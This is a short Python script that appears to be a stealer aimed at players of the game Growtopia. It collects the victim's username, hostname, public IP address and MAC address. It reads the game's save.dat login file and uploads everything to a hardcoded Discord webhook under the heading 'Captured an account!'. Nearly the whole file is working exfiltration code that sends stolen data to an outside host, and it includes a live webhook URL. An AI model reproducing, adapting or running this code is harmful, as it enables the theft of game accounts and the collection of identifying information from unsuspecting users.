from discord_webhook import DiscordWebhook, DiscordEmbed
from os import getenv
import socket
from requests import get
import re, uuid

try:
  ipaddress = get("https://api.ipify.org").text
  info = DiscordEmbed(title='Captured an account!',description='''
  
  Username:    '''+getenv('username')+ "/" +socket.gethostname()+'''
  IP Address : '''+ipaddress+''' 
  MAC Address: '''+':'.join(re.findall('..', '%012x' % uuid.getnode()))+''' 
  ''', color='e6f613')
  data = getenv('LOCALAPPDATA')+ '\\Growtopia\\save.dat'
  webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1039989620584235120/Ntt-Wb3glQlMT46YvAhogjnHKLngP6WAYvj4q1wlIOWsE8ddEtSHYrr3Znb6j5Yicqyt')



  with open(data, 'rb') as f:
     webhook.add_embed(info)
     webhook.add_file(file=f.read(), filename='save.dat')
     response = webhook.execute()

except:
    error = "[!]save.dat doesn't exist or the file name was changed!"
    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1039989620584235120/Ntt-Wb3glQlMT46YvAhogjnHKLngP6WAYvj4q1wlIOWsE8ddEtSHYrr3Znb6j5Yicqyt', content=error)
    response = webhook.execute()